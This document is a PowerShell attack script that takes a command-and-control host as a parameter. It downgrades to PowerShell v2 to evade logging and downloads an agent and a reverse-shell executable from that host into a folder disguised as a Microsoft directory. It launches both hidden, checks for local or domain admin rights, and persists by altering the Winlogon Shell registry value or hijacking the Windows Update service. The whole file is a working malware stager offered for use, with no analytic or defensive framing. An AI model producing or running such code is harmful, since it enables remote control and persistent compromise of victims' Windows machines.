param(
    [Parameter(Mandatory=$true)]
    [string]$C2
)

# ----------------------------------------
# 0. Check for PowerShell v2 and relaunch if available
# ----------------------------------------
$v2Exists = Get-Command powershell.exe -ErrorAction SilentlyContinue | ForEach-Object {
    $true
}
if ($v2Exists -and $PSVersionTable.PSVersion.Major -gt 2) {
    powershell -version 2 -file $MyInvocation.MyCommand.Path -C2 $C2
    exit
}

# ----------------------------------------
# 1. Prepare storage folder
# ----------------------------------------
$persistDir = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\Temp"
if (!(Test-Path $persistDir)) { New-Item -ItemType Directory -Path $persistDir -Force | Out-Null }

# Paths for binaries
$agentPath = Join-Path $persistDir "agent.exe"
$revShellPath = Join-Path $persistDir "revshell.exe"

# ----------------------------------------
# 2. Download & launch agent.exe
# ----------------------------------------
Invoke-WebRequest "http://$C2/payloads/agent.exe" -OutFile $agentPath
Start-Process $agentPath -WindowStyle Hidden

# ----------------------------------------
# 3. Download & launch revshell.exe
# ----------------------------------------
Invoke-WebRequest "http://$C2/payloads/revshell.exe" -OutFile $revShellPath
Start-Process $revShellPath -WindowStyle Hidden

# ----------------------------------------
# 4. Detect privilege level
# ----------------------------------------
$privilegeLevel = "User"

if ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $privilegeLevel = "LocalAdmin"
}

try {
    $domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $domainAdmins = (New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=$($domain -replace '\.',',DC=')")).FindAll() | ForEach-Object {
        $_.Properties.samaccountname
    }
    if ($domainAdmins -contains $currentUser.Split('\')[1]) { $privilegeLevel = "DomainAdmin" }
} catch {
    # Not in domain or cannot access AD
}

# ----------------------------------------
# 5. Conditional persistence
# ----------------------------------------
if ($privilegeLevel -eq "User") {
    # Winlogon Shell persistence
    $shellVal = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").Shell
    if (-not $shellVal) { $shellVal = "explorer.exe" }
    $newShellVal = "$shellVal, $agentPath, $revShellPath"
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value $newShellVal
}
else {
    # Modify wuauserv to launch both binaries
    $svc = Get-WmiObject -Class Win32_Service -Filter "Name='wuauserv'"
    if ($svc) {
        $currentPath = $svc.PathName.Trim('"')
        $newPath = "$currentPath & `"$agentPath`" & `"$revShellPath`""
        $svc.Change($null,$null,$null,$null,$null,$null,$newPath,$null)
        Start-Service wuauserv
    }
}
